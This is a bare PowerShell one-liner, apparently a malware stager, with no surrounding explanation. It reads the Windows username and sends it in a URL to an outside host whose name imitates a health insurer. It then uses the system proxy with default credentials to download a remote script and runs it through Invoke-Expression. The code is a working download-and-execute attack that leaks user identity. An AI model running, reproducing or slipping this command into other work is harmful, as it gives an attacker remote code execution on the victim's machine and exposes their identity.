
$x=$Env:username;$u="http://www.bcbs-arizona.org/s2.txt?u=" + $x;$p = [System.Net.WebRequest]::GetSystemWebProxy();$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;$w=New-Object net.webclient;$w.proxy=$p;$w.UseDefaultCredentials=$true;$s=$w.DownloadString($u);Invoke-Expression -Command $s;

